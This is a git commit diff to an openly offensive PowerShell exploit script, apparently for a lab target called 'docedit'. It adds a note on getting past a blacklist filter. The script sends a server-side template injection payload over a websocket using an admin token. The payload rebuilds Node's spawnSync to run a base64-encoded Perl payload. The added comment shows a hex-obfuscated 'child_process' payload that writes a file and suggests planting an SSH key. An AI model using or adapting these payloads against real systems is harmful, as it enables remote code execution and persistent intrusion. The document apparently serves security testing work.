d349ae0e8c861797082597971977f69cd8fa4308
zinhart <aromzinhartdegraca@gmail.com>
2023-04-14 22:03:22 -0700

    added ssti blacklist filter bypass

--- docedit/rce-time-based-blind-ssti.ps1
+++ docedit/rce-time-based-blind-ssti.ps1
@@ -289,7 +289,13 @@ $b64_payload
 $ssti_payload =@"
 42["updateSettings",{"homePage":"h1= title\r\np Welcome to #{title}\r\n\r\n#{7*7}\r\n\r\n#{spawn_sync = this.process.binding('spawn_sync')}\r\n#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}}\r\n#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}}\r\n#{payload='$b64_payload'}\r\n#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}\r\n","token":"$admin_auth_token"}]
 "@
-
+<#
+More simply we can write to the file system and create an sshkey for example:
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73").exec('touch /tmp/pwned.txt')}()}
+\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73 is just hex encoded child_process.
+Yet another example of why blacklist input filters are extremely easy to default.
+We could for example write an ssh key onti the file
+#>
 Send-Message -Message $ssti_payload -SocketId 0
 Receive-Message -SocketId 0
 Send-Message -Message '42["getHome"]' -SocketId 0
